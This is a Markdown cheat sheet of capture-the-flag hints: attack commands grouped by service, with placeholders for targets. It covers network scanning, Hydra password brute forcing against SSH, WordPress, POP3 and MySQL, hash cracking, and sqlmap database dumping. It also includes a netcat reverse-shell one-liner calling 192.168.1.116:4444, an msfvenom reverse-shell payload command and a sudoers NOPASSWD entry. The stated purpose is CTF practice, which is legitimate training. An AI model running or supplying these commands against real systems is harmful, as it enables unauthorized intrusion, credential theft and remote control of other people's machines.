# Capture The Flag Hints

## Networking
```
$ netdiscover -r {NETWORK}/{MASK}

$ nmap -sV {NETWORK}/{MASK}
```

## Port Scanning
```
# Simple Scan
$ nmap {TARGET}

# Port Range Scan
$ nmap -p {MIN}-{MAX} {TARGET}

# All Ports Scan
$ nmap -p- {TARGET}

# Complete Scan
$ nmap -AT4 -p- {TARGET}

# Script Scan
$ nmap --script=vuln {TARGET}
```

## WEB Analysis
```
$ nikto -h {TARGET}

$ dirb {TARGET}

$ gobuster dir -t 50 -u {TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

$ gobuster dir -t 50 -u {TARGET} -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.js,/,.html --wildcard
```

## WordPress
```
# Simple Scan
$ wpscan --url {TARGET}

# Complete Scan
$ wpscan -e ap,at --url {TARGET}

$ Looking for vulnerabilities
$ wpscan -e vp,vt --url {TARGET}

# User Enummeration
$ wpscan -e u --url {TARGET}
```

## Brute Force - Hashes
```
# Hash-Identifier
$ hash-identifier

# HashId
$ hashid -mj {HASH}

# Crack with hashcat
$ hashcat -m {MODE} {HASH_FILE} /usr/share/wordlists/rockyou.txt

# Crack with John
$ john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE} 
$ john --show {HASH_FILE}

# MD5 ( $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 )
$ hashcat -m 400

# Linux /etc/passwd ( root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7::: )
$ john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE}

# Linux /etc/passwd raw ( $6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1 )
$ hashcat -m 1800
```

## Brute Force - SSH
```
# Hydra
$ hydra -l {SINGLE_USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
$ hydra -L {USERS_LIST} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
```

## Brute Force - ZIP
```
# John
$ zip2john {ZIP_FILE} > {ZIP_FILE}.hash
$ john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
$ john --show {ZIP_FILE}.hash

# fcrackzip
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
```

## Brute Force - WordPress
```
# Hydra
$ hydra -l {SINGLE_USER} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
$ hydra -L {USERS_LIST} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"

# Wpscan
$ wpscan --url {TARGET} -U {USERS_LIST} -P /usr/share/wordlists/rockyou.txt
```

## Brute Force - pop3 Mail Server
```
$ hydra -l {SINGLE_USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
$ hydra -L {USERS_LIST} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
```

## Brute Force - MySQL
```
$ hydra -l {SINGLE_USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
$ hydra -L {USERS_LIST} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
```

## Shell
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## FTP
```
# Access
$ ftp {TARGET}

# Download file to current directory
ftp> ls
ftp> get {FILE}

# Download multiples file to current directory
ftp> mget {DIRECTORY}

# pwd
ftp> pwd
```

## SMB
```
# Disks list
$ smbmap -H {TARGET}

# Connection
$ smbclient //{TARGET}/{DISK}

# Download file to current directory
smb: \> dir
smb: \> get {FILE}
```

## Pop3 Mail Server
```
$ nc {TARGET} pop3

> LIST
> RETR {ID}
```

## SSH
```
# Password Auth
$ ssh {USER}@{IP}

# Key Auth in specific port
$ ssh {USER}@{IP} -i {KEY} -p {PORT}
```

## SCP
```
# Local to remote
$ scp {LOCAL_PATH} {USER}@{IP}:{REMOTE_PATH}

# Remote to Local
$ scp {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}

# Key Auth in Specific Port
$ scp -i {KEY} -p {PORT} {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
```

## SUID
```
# SUID Binaries
$ find / -type f -perm -u=s 2>/dev/null
```

## WEB Server
```
$ python -m SimpleHTTPServer 8080
$ python3 -m http.server 8080

# GET
$ wget http://{TARGET}:{PORT}/{URI}
```

## Base64 / Base32
```
# Base64 Encoding
$ base64 {FILE}
$ base64 "{DATA}"
$ cat {FILE} | base64
$ echo "{DATA}" | base64

# Base64 Decoding
$ base64 -d {FILE}
$ base64 -d "{DATA}"
$ cat {FILE} | base64 -d
$ echo "{DATA}" | base64 -d

# Base32 Encoding
$ base32 {FILE}
$ base32 "{DATA}"
$ cat {FILE} | base32
$ echo "{DATA}" | base32

# Base32 Decoding
$ base32 -d {FILE}
$ base32 -d "{DATA}"
$ cat {FILE} | base32 -d
$ echo "{DATA}" | base32 -d
```

## Bin to ASCII
```
$ cat bin.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010

$ cat bin2ascii.sh

#!/bin/bash
ARRAY=$(cat $1)
for bin in $ARRAY
do
	dec=$((2#${bin}))
	echo -ne \\x$(printf %02x $dec)
done
```

## Hex to ASCII
```
$ echo {HEX_TEXT} | xxd -r -p
```

## ASCII to Char
```
$ cat ascii2char.c

#include <stdlib.h>
#include <stdio.h>

void main(void) {
	int ascii[] = {117, 115, 101, 32, 114, 111, 99, 107, 121, 111, 117, 46, 116, 120, 116};
	for (int i=0; i<sizeof(ascii)/sizeof(int); i++) printf("%c", ascii[i]);
	printf("\n");
}

$ gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
```

## MySQL
```
# Connection
$ mysql -u {USER} -h {TARGET} -p {PASSWORD}

mysql> show databases;
mysql> user {DATABASE};
mysql> show tables;
mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
```

## Sudo
```
$ sudo -l

# Run command as another user
$ sudo -u {USER} {COMMAND}

# /etc/sudoers
# {USER} ALL=(ALL) NOPASSWD: ALL
```

## Netcat
```
# Listen
$ nc -lcnp {PORT}

# Reverse shell using backpipe
$ mknod /tmp/backpipe p
$ /bin/sh 0</tmp/backpipe | nc 192.168.1.116 4444 1>/tmp/backpipe
```

## Payloads
```
# Linux python payload raw
$ msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
```

## Linux Password
```
# Generate a password hash
$ openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```

## Custom Wordlists
```
$ cewl http://192.168.1.101/index.html > wordlist.txt
$ cewl {FILE} > wordlist.txt
```

## Update Datase Password Hash
```
$ echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99

mysql> UPDATE {TABLE} SET {FIELD}='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID={ID};
```

## SQL Injection
```
# login.req is a text file with a login POST intercepted by Burp
$ sqlmap -r login.req -p {POST_PARAMETER} --batch

$ sqlmap -r login.req -p u --batch --current-db
$ sqlmap -r login.req -p u --batch -D {DB} --tables
$ sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} --columns
$ sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
```

## Steganography
```
$ exiftool {FILE}

$ steghide extract -sF {FILE}
```

## NFS (Networking File System)
```
# List mount points
$ showmount -e {TARGET}

# Mount
$ mount {TARGET}:{MOUNT_POINT} {LOCAL_PATH}

# mount
$ umount {LOCAL_PATH}
```

## GPG
```
# Decrypt
$ gpg -d {GPG_FILE}
```

## OpenSSL
```
# Decrypt
$ openssl rsautl -decrypt -inkey {PRIV_KEY} -in {ENCRYPTED_FILE} -out {DECRYPTED_FILE}
```

## RDP (Remote Desktop)
```
$ xfreerdp /u:{USER} /p:{PASS} /v:{TARGET}
```

## AWS S3
```
$ curl {BUCKET_NAME}.s3.amazonaws.com | xmllint --format -

# Download a file
$ curl {BUCKET_NAME}.s3.amazonaws.com/{FILE}
```
